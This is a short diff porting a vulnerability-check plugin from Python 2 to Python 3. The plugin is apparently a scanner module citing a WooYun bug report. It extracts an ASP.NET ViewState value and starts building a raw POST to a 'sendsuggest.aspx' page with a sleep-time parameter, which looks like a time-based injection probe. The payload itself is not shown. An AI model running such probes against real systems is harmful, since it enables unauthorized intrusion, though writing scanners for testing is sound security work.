@@ -2,7 +2,7 @@
 #-*- coding: utf-8 -*-
 #ref:http://www.wooyun.org/bugs/wooyun-2015-0146921
 import re
-import urllib,time
+import urllib.request, urllib.parse, urllib.error,time
 
 def assign(service, arg):
     if service == "soffice":
@@ -14,7 +14,7 @@ def audit(arg):
     if code != 200:
         return
     patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"',res)
-    p1 = urllib.quote(patten[0])
+    p1 = urllib.parse.quote(patten[0])
     def make_raw(view_state,sleep_time):
         raw = '''
 POST /advicemanage/sendsuggest.aspx HTTP/1.1
